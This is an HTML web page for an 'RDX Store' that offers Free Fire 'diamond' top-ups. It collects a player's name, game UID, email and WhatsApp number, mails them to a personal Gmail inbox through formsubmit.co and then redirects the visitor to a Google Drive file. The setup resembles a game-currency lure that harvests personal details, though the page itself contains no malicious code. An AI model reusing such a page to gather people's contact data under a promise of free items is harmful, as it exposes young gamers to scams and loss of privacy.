<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirm Details | RDX Store</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #ffffff;
            font-family: 'Poppins', sans-serif;
            display: flex;
            flex-direction: column;
            align-items: center;
            color: #333;
        }

        .header {
            width: 100%;
            background-color: #F57C00;
            color: white;
            text-align: center;
            padding: 20px 0;
            font-weight: 800;
            text-transform: uppercase;
            box-shadow: 0 4px 10px rgba(0,0,0,0.1);
            margin-bottom: 20px;
        }

        .form-container {
            width: 90%;
            max-width: 400px;
            padding: 25px 20px;
            background: #fff;
            border-radius: 15px;
            border: 2px solid #F57C00;
            box-shadow: 0 10px 25px rgba(245, 124, 0, 0.1);
        }

        .input-group {
            margin-bottom: 15px;
            position: relative;
        }

        label {
            display: block;
            font-weight: bold;
            margin-bottom: 6px;
            color: #F57C00;
            font-size: 13px;
        }

        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ccc;
            border-radius: 10px;
            box-sizing: border-box;
            font-size: 15px;
            outline: none;
            transition: 0.3s;
        }

        input:focus {
            border-color: #2ecc71; /* Green focus */
            box-shadow: 0 0 8px rgba(46, 204, 113, 0.2);
        }

        .error-msg {
            color: #e74c3c;
            font-size: 11px;
            font-weight: bold;
            margin-top: 4px;
            display: none;
        }

        .submit-btn {
            width: 100%;
            background-color: #2ecc71;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 800;
            border-radius: 12px;
            cursor: pointer;
            text-transform: uppercase;
            margin-top: 15px;
            box-shadow: 0 5px 15px rgba(46, 204, 113, 0.3);
            transition: 0.3s;
        }

        .submit-btn:active {
            transform: scale(0.95);
        }

        .footer-note {
            margin-top: 25px;
            font-size: 11px;
            color: #999;
            text-align: center;
        }
    </style>
</head>
<body>

    <div class="header">RDX Store - UID Verification</div>

    <div class="form-container">
        <form id="rdxForm" action="https://formsubmit.co/rdxffac@gmail.com" method="POST">
            
            <input type="hidden" name="_next" value="https://drive.google.com/file/d/1MnvTEzpbkF7CQLOpYM5PsSTeqm5ncPaB/view?usp=drivesdk">
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_subject" value="New Diamond Topup Order!">

            <div class="input-group">
                <label>Full Name</label>
                <input type="text" name="Name" id="name" placeholder="Enter name">
                <div id="nameErr" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>Free Fire UID</label>
                <input type="number" name="FF_UID" id="uid" placeholder="Enter Player UID">
                <div id="uidErr" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>Confirm UID</label>
                <input type="number" id="cuid" placeholder="Confirm Player UID">
                <div id="matchErr" class="error-msg">UID not match</div>
            </div>

            <div class="input-group">
                <label>Email Address</label>
                <input type="email" name="Email" id="email" placeholder="Enter email">
                <div id="emailErr" class="error-msg">Enter details</div>
            </div>

            <div class="input-group">
                <label>WhatsApp Number</label>
                <input type="number" name="WhatsApp" id="whatsapp" placeholder="Enter WhatsApp number">
                <div id="whatsappErr" class="error-msg">Enter details</div>
            </div>

            <button type="button" onclick="handleForm()" class="submit-btn">Get Diamond</button>
        </form>
    </div>

    <div class="footer-note">
        Powered by RDX FF Store © 2026
    </div>

    <script>
        function handleForm() {
            const fields = ['name', 'uid', 'email', 'whatsapp'];
            const uid = document.getElementById('uid').value;
            const cuid = document.getElementById('cuid').value;
            let valid = true;

            // Check empty fields
            fields.forEach(f => {
                const el = document.getElementById(f);
                const err = document.getElementById(f + 'Err');
                if (!el.value) {
                    err.style.display = 'block';
                    valid = false;
                } else {
                    err.style.display = 'none';
                }
            });

            // Check UID Match
            const matchErr = document.getElementById('matchErr');
            if (uid && cuid) {
                if (uid !== cuid) {
                    matchErr.innerText = "UID not match";
                    matchErr.style.display = 'block';
                    valid = false;
                } else {
                    matchErr.style.display = 'none';
                }
            } else if (!cuid) {
                matchErr.innerText = "Enter details";
                matchErr.style.display = 'block';
                valid = false;
            }

            if (!valid) {
                // Vibration on error
                if (window.navigator && window.navigator.vibrate) {
                    window.navigator.vibrate(200);
                }
                return;
            }

            // Submit Form
            document.getElementById('rdxForm').submit();
        }
    </script>

</body>
                    </html>
